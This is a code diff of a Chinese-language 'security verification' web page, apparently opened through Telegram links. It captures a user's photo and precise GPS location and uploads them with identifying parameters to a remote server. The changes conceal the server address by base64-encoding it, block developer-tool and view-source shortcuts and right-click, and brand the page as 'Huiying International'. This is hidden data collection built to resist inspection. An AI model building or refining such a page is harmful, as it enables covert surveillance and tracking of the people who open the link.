@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>安全验证终端</title>
+    <title>汇盈国际安全验证终端</title>
     <style>
-        /* ==================== 0. 全局设置 ==================== */
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
@@ -13,204 +12,159 @@
             font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
             color: #fff;
         }
-
-        /* ==================== 1. 全屏相机容器 ==================== */
         #camera-container { 
             position: relative; width: 100%; height: 100%; 
             z-index: 1;
         }
-        
-        /* 视频与画布重叠，用于定格画面 */
         video, canvas { 
             position: absolute; top: 0; left: 0;
             width: 100%; height: 100%; object-fit: cover; 
         }
-        #canvas { display: none; z-index: 2; } /* 拍照后显示这个 */
-
-        /* ==================== 2. 高级 HUD 界面 (透明悬浮) ==================== */
-        
-        /* 四角装饰 (科技感) */
+        #canvas { display: none; z-index: 2; }
         .corner {
             position: absolute; width: 40px; height: 40px;
-            border-color: rgba(255, 255, 255, 0.4); border-style: solid;
+            border-color: rgba(255, 255, 255, 0.5); border-style: solid;
             z-index: 10; pointer-events: none;
+            filter: drop-shadow(0 0 2px rgba(0,0,0,0.5));
         }
         .tl { top: 20px; left: 20px; border-width: 2px 0 0 2px; }
         .tr { top: 20px; right: 20px; border-width: 2px 2px 0 0; }
         .bl { bottom: 20px; left: 20px; border-width: 0 0 2px 2px; }
         .br { bottom: 20px; right: 20px; border-width: 0 2px 2px 0; }
-
-        /* 顶部信息 */
         .header-info {
             position: absolute; top: 50px; left: 0; width: 100%;
             text-align: center; z-index: 10;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+            display: flex; flex-direction: column; align-items: center; gap: 10px;
         }
         .status-badge {
-            display: inline-flex; align-items: center; gap: 6px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 6px 16px; border-radius: 30px;
-            backdrop-filter: blur(10px);
-            font-size: 13px; letter-spacing: 1px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            display: inline-flex; align-items: center; gap: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 8px 18px; border-radius: 30px;
+            backdrop-filter: blur(4px);
+            font-size: 14px; letter-spacing: 1px; font-weight: 500;
         }
-        .dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; box-shadow: 0 0 8px #00ff88; }
-
-        /* ==================== 3. 底部控制区 (全透明) ==================== */
+        .dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; box-shadow: 0 0 8px #0f0; }
+        .location-hud {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px; color: rgba(255,255,255,0.8);
+            background: rgba(0,0,0,0.3); padding: 4px 10px;
+            border-radius: 4px; border: 1px solid rgba(255,255,255,0.1);
+            display: none;
+        }
         .controls-area {
             position: absolute; bottom: 0; left: 0; width: 100%;
-            height: 180px; z-index: 20;
-            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, transparent 100%);
+            height: 200px; z-index: 20;
+            background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
             display: flex; justify-content: center; align-items: center;
         }
-
-        /* 拍照按钮 (极简圆环) */
         .shutter-btn {
-            width: 80px; height: 80px;
+            width: 84px; height: 84px;
             border-radius: 50%;
-            border: 4px solid rgba(255, 255, 255, 0.8);
+            border: 4px solid rgba(255, 255, 255, 0.9);
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(4px);
             position: relative; cursor: pointer;
-            transition: transform 0.2s;
-            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            box-shadow: 0 0 20px rgba(0,0,0,0.4);
+            transition: transform 0.1s;
         }
         .shutter-btn::after {
             content: ''; position: absolute;
             top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 66px; height: 66px;
+            width: 70px; height: 70px;
             background: #fff; border-radius: 50%;
             transition: all 0.2s;
         }
         .shutter-btn:active { transform: scale(0.95); }
-        .shutter-btn:active::after { width: 60px; height: 60px; opacity: 0.8; }
-
-        /* ==================== 4. 状态/错误处理层 (覆盖在照片上) ==================== */
+        .shutter-btn:active::after { width: 62px; height: 62px; opacity: 0.8; }
         #result-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); backdrop-filter: blur(5px);
-            z-index: 50;
-            display: none; /* 默认隐藏 */
+            background: rgba(0,0,0,0.6); backdrop-filter: blur(8px);
+            z-index: 50; display: none;
             flex-direction: column; justify-content: center; align-items: center;
         }
-        
-        /* 错误提示卡片 */
-        .msg-box {
-            text-align: center; padding: 20px;
-        }
-        .msg-title { font-size: 20px; font-weight: bold; margin-bottom: 10px; }
-        .msg-sub { font-size: 14px; color: #ccc; margin-bottom: 30px; }
-
-        /* 按钮组 */
+        .msg-box { text-align: center; padding: 20px; width: 80%; }
+        .msg-title { font-size: 22px; font-weight: bold; margin-bottom: 12px; }
+        .msg-sub { font-size: 14px; color: #ddd; margin-bottom: 30px; line-height: 1.5; }
         .action-btn {
-            padding: 12px 30px; border-radius: 30px;
-            font-size: 15px; font-weight: 500; cursor: pointer;
-            border: none; margin: 10px;
-            transition: all 0.2s; min-width: 160px;
-            display: block;
+            padding: 14px 0; width: 100%; border-radius: 12px;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            border: none; margin-bottom: 12px;
+            transition: opacity 0.2s; color: white;
+            display: block; box-shadow: 0 4px 12px rgba(0,0,0,0.3);
         }
-        
-        /* 蓝色按钮：重试定位 */
-        .btn-retry {
-            background: linear-gradient(135deg, #007aff, #0056b3);
-            color: white; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
-        }
-        
-        /* 红色按钮：强制发送 */
-        .btn-force {
-            background: linear-gradient(135deg, #ff3b30, #d70015);
-            color: white; box-shadow: 0 4px 15px rgba(255, 59, 48, 0.4);
-            animation: pulse 2s infinite;
-        }
-        
-        /* 灰色按钮：取消/重拍 */
-        .btn-cancel {
-            background: rgba(255,255,255,0.1); color: #fff;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        /* 链接失效的全屏警告 */
+        .action-btn:active { opacity: 0.8; }
+        .btn-retry { background: #007aff; }
+        .btn-force { background: #ff3b30; animation: pulse 2s infinite; }
+        .btn-cancel { background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.2); }
         #invalid-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 100;
+            background: #1c1c1e; z-index: 100;
             display: none; flex-direction: column;
             justify-content: center; align-items: center; text-align: center;
         }
-        .icon-error { font-size: 60px; margin-bottom: 20px; }
-
-        /* 加载动画 */
+        .icon-error { font-size: 64px; margin-bottom: 24px; }
         .loader {
-            width: 48px; height: 48px; border: 3px solid #FFF;
+            width: 48px; height: 48px; border: 4px solid #FFF;
             border-bottom-color: transparent; border-radius: 50%;
-            display: inline-block; box-sizing: border-box;
-            animation: rotation 1s linear infinite; margin-bottom: 20px;
+            display: inline-block; animation: rotation 1s linear infinite; margin-bottom: 20px;
         }
         @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
     </style>
 </head>
-<body>
-
-<!-- 相机取景器 -->
+<body oncontextmenu="return false;">
 <div id="camera-container">
-    <!-- 装饰元素 -->
     <div class="corner tl"></div><div class="corner tr"></div>
     <div class="corner bl"></div><div class="corner br"></div>
-
-    <!-- 顶部状态 -->
     <div class="header-info">
         <div class="status-badge">
             <div class="dot" id="status-dot"></div>
             <span id="user-display">系统就绪</span>
         </div>
+        <div class="location-hud" id="loc-display">WAITING GPS...</div>
     </div>
-
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
-
-    <!-- 底部拍照按钮 -->
     <div class="controls-area" id="controls">
         <div class="shutter-btn" id="shutter"></div>
     </div>
 </div>
-
-<!-- 结果/加载/错误 覆盖层 -->
 <div id="result-overlay">
     <div class="msg-box">
         <div class="loader" id="spinner"></div>
         <div class="msg-title" id="overlay-title">正在上传</div>
         <div class="msg-sub" id="overlay-desc">正在加密传输数据...</div>
-        
-        <!-- 操作按钮区域 (初始隐藏) -->
         <div id="action-area" style="display:none;">
-            <!-- 只重新获取位置，不重拍 -->
             <button class="action-btn btn-retry" id="btn-retry-loc">📡 重新获取位置</button>
-            
-            <!-- 强制发送 (3次失败后出现) -->
             <button class="action-btn btn-force" id="btn-force" style="display:none;">⚠️ 强制发送 (无定位)</button>
-            
-            <!-- 重拍按钮 -->
             <button class="action-btn btn-cancel" id="btn-cancel">🔄 重拍照片</button>
         </div>
     </div>
 </div>
-
-<!-- 链接失效专用层 -->
 <div id="invalid-screen">
     <div class="icon-error">⛔️</div>
-    <h2>链接已失效</h2>
-    <p style="color:#888; padding: 0 20px; margin-top: 10px;">安全令牌已过期或被重置。<br>请在群内使用指令重新获取最新链接。</p>
+    <h2 style="margin:0;font-weight:600;">链接已失效</h2>
+    <p style="color:#888; padding: 0 30px; margin-top: 15px; font-size:15px; line-height:1.6;">
+        安全令牌已过期。<br>请联系负责人或中介重新获取最新链接。
+    </p>
 </div>
-
 <script>
-    // =================================================================
-    // ⚠️⚠️⚠️ 必须修改：配置后端地址 (不带斜杠) ⚠️⚠️⚠️
-    const BACKEND_URL = "https://huiying888.onrender.com"; 
-    // =================================================================
+    const _0x1a2b = "aHR0cHM6Ly9odWl5aW5nODg4Lm9ucmVuZGVyLmNvbQ=="; 
+    const BACKEND_URL = atob(_0x1a2b); 
 
-    // DOM 元素
+    document.addEventListener('keydown', function(e) {
+        if (
+            e.keyCode === 123 || 
+            (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
+            (e.ctrlKey && e.keyCode === 83) || 
+            (e.ctrlKey && e.keyCode === 85) 
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const shutter = document.getElementById('shutter');
@@ -225,8 +179,8 @@
     const btnCancel = document.getElementById('btn-cancel');
     const invalidScreen = document.getElementById('invalid-screen');
     const userDisplay = document.getElementById('user-display');
+    const locDisplay = document.getElementById('loc-display');
 
-    // URL 参数
     const params = new URLSearchParams(window.location.search);
     const chatId = params.get('chatid');
     const uid = params.get('uid') || '0';
@@ -235,9 +189,8 @@
 
     if (name) userDisplay.innerText = `验证中: ${name}`;
 
-    let failCount = 0; // 定位失败计数器
+    let failCount = 0;
 
-    // 1. 启动相机 (高清)
     async function startCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
@@ -245,80 +198,58 @@
                 audio: false
             });
             video.srcObject = stream;
-        } catch (err) {
-            alert("相机启动失败，请检查权限");
-        }
+        } catch (err) { alert("相机启动失败，请检查权限"); }
     }
 
-    // 2. 拍照逻辑 (点击快门)
     shutter.addEventListener('click', () => {
         if (!chatId) return showInvalidScreen();
-        
-        // A. 定格画面
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        // 切换显示：隐藏视频，显示画布 (造成“定格”效果)
         video.style.display = 'none';
         canvas.style.display = 'block';
-        controls.style.display = 'none'; // 隐藏拍照按钮
-
-        // B. 开始流程 (重置计数器)
-        // failCount = 0; // 如果你想每次重新拍照都重置计数器，取消注释这行
+        controls.style.display = 'none';
         startUploadProcess(true);
     });
 
-    // 3. 上传流程控制
     function startUploadProcess(retryLocation) {
-        // 显示遮罩
         overlay.style.display = 'flex';
         actionArea.style.display = 'none';
         spinner.style.display = 'inline-block';
-        
         if (retryLocation) {
             title.innerText = "正在获取卫星定位...";
             desc.innerText = "为了您的安全，请确保GPS已开启";
             getLocationAndUpload();
         } else {
-            // 强制上传模式
             title.innerText = "强制上传中...";
             desc.innerText = "正在使用备用通道...";
             executeUpload(0, 0);
         }
     }
 
-    // 4. 获取定位 (高精度模式)
     function getLocationAndUpload() {
         if (!navigator.geolocation) return handleLocError("设备不支持定位");
-
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                // 成功
+                const lat = pos.coords.latitude.toFixed(6);
+                const lng = pos.coords.longitude.toFixed(6);
                 title.innerText = "定位成功";
+                locDisplay.style.display = 'block';
+                locDisplay.innerText = `LAT:${lat} LNG:${lng}`;
                 executeUpload(pos.coords.latitude, pos.coords.longitude);
             },
-            (err) => {
-                handleLocError(err);
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            (err) => { handleLocError(err); },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
     }
 
-    // 5. 处理定位错误
     function handleLocError(err) {
         console.warn("Loc Error:", err);
         failCount++;
-        
-        // 显示错误状态
         spinner.style.display = 'none';
         title.innerText = "⚠️ 定位失败";
-        desc.innerText = `请尝试移动位置或点击重试 (${failCount})`;
-        
-        // 显示按钮
+        desc.innerText = `无法获取精确位置，请尝试重试。或联系负责人！ (${failCount})`;
         actionArea.style.display = 'block';
-        
-        // 失败3次以上显示强制按钮
         if (failCount >= 3) {
             btnForce.style.display = 'block';
         } else {
@@ -326,7 +257,6 @@
         }
     }
 
-    // 6. 执行上传
     function executeUpload(lat, lng) {
         canvas.toBlob(async (blob) => {
             try {
@@ -334,59 +264,41 @@
                     chatid: chatId, uid: uid, name: name, 
                     lat: lat, lng: lng, time: Date.now(), token: token
                 });
-
                 const response = await fetch(`${BACKEND_URL}/upload?${params.toString()}`, {
                     method: 'POST',
                     body: blob,
                     headers: { 'Content-Type': 'application/octet-stream' }
                 });
-
-                if (response.status === 403) {
-                    showInvalidScreen();
-                    return;
-                }
-
+                if (response.status === 403) { showInvalidScreen(); return; }
                 if (!response.ok) throw new Error("服务器响应错误");
                 const result = await response.json();
-
                 if (result.code === 0) {
-                    title.innerText = "✅ 验证通过";
+                    title.innerText = "✅成功";
                     desc.innerText = "数据已安全传输，请关闭页面";
                     spinner.style.display = 'none';
                     setTimeout(() => {
-                        window.close();
+                        if (window.Telegram && window.Telegram.WebApp) {
+                            window.Telegram.WebApp.close();
+                        } else { window.close(); }
                     }, 2000);
-                } else {
-                    throw new Error(result.msg);
-                }
+                } else { throw new Error(result.msg); }
             } catch (err) {
                 spinner.style.display = 'none';
                 title.innerText = "❌ 上传失败";
                 desc.innerText = err.message;
                 actionArea.style.display = 'block';
-                // 上传失败也允许重试
             }
         }, 'image/jpeg', 0.8);
     }
 
-    // 7. 按钮事件绑定
-    
-    // [重新获取位置] -> 仅仅重跑定位逻辑，不重拍
-    btnRetry.addEventListener('click', () => {
-        startUploadProcess(true);
-    });
-
-    // [强制发送] -> 跳过定位上传
-    btnForce.addEventListener('click', () => {
-        startUploadProcess(false);
-    });
-
-    // [重拍] -> 复位界面，回到视频流
+    btnRetry.addEventListener('click', () => { startUploadProcess(true); });
+    btnForce.addEventListener('click', () => { startUploadProcess(false); });
     btnCancel.addEventListener('click', () => {
         overlay.style.display = 'none';
         canvas.style.display = 'none';
         video.style.display = 'block';
         controls.style.display = 'flex';
+        locDisplay.style.display = 'none'; 
     });
 
     function showInvalidScreen() {
@@ -394,7 +306,6 @@
         invalidScreen.style.display = 'flex';
     }
 
-    // 启动
     startCamera();
 </script>
 </body>
